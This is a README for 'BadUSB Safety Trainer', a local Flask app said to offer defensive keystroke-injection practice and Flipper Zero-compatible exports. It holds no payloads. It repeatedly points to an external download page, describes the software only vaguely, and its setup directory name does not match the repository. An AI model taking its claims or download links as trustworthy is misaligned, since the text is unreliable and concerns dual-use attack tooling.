# BadUSB Safety Trainer v2026 - cybersecurity training web app 2026

> **A local web app for practicing USB keystroke injection defenses with safe templates, previewable exports, and a Flipper Zero-compatible workflow.**

[![Platform](https://img.shields.io/badge/Platform-local%20web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mkelly471/badusb-safety-trainer-2026?style=flat-square)](https://github.com/mkelly471/badusb-safety-trainer-2026)

---

<p align="center">
  <a href="https://mkelly471.github.io/badusb-safety-trainer-2026/">
    <img src="https://img.shields.io/badge/Download-BadUSB%20Safety%20Trainer%20Latest-brightgreen?style=for-the-badge" alt="Download BadUSB Safety Trainer">
  </a>
</p>

> **[Download BadUSB Safety Trainer v2026](https://mkelly471.github.io/badusb-safety-trainer-2026/)**

---

[Download Latest Build](https://mkelly471.github.io/badusb-safety-trainer-2026/)

---

## What Is BadUSB Safety Trainer?

BadUSB Safety Trainer is a locally hosted web application for defensive learning about BadUSB behavior and USB keystroke injection. It offers a contained workspace for browsing practice templates, examining generated scripts before export, and completing exercises without depending on an online service.

The project is intended for students, instructors, and private lab setups that need to record exercises and produce files suitable for familiar hardware workflows, including Flipper Zero-compatible TXT files. Information such as notes, acknowledgements, and export records is maintained locally through JSON storage.

---

## Included Capabilities

- Defensive-practice templates designed for safe training
- In-browser script inspection before any export is created
- TXT export compatible with Flipper Zero workflows
- Safety acknowledgement steps within the training process
- Local lab notes and export history for session records
- A checklist for reviewing USB security considerations
- Straightforward offline data storage based on JSON
- Local web serving for use in a private lab environment

---

## Getting Started

Place the repository in a local directory by cloning it or downloading its files:

```bash
git clone https://github.com/mkelly471/badusb-safety-trainer-2026.git
cd badusb_safety_trainer
```

Use a local Python environment with Flask to run the application, and then visit the local address in your browser.

For example:

```bash
python app.py
```

When the project uses a different entry script, launch the primary Flask file supplied with the project instead.

---

## Using the Application

1. Launch the local interface in a web browser.
2. Pick an appropriate safe exercise from the training template library.
3. Examine the script preview before producing an export.
4. Record lab notes and complete any requested safety acknowledgements.
5. Generate the output format required for the intended workflow.
6. Consult the export history to see previously generated items.

A standard exercise flow looks like this:

- Choose a BadUSB training scenario
- Examine the resulting keystroke sequence
- Verify the context in which the exercise is being performed
- Create a Flipper Zero-compatible TXT export when required

---

## Local Data and Configuration

The application keeps project information in local JSON files. Where configuration options are available, they are expected to be located near the application or within the Flask project's local storage directory.

A representative data structure is:

```json
{
  "templates": [],
  "lab_notes": [],
  "export_history": [],
  "acknowledgements": []
}
```

To keep templates, notes, or exports in different locations, modify the storage path or Flask settings in the project files.

---

## Requirements

- A web browser running on the local machine
- Python with the Flask runtime
- Local file-system access for JSON data
- Sufficient disk capacity for templates, notes, and export records
- Optional use of Flipper Zero-style TXT export workflows

---

## Frequently Asked Questions

**Does the application require an online service?**  
No. It is intended to run as a local web application on your own computer.

**What kind of training does it support?**  
It is designed for defensive practice involving BadUSB and USB keystroke injection concepts.

**Can generated content be checked before it is exported?**  
Yes. Use the script preview to inspect the output before exporting it.

**Where does the application save notes and export records?**  
The application stores them locally using JSON-based storage.

**How should I troubleshoot a startup failure?**  
Verify that Flask and the necessary Python environment are installed, then make sure you are running the project's correct entry-point script.

---

## License

This project is distributed under the GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the full license text.
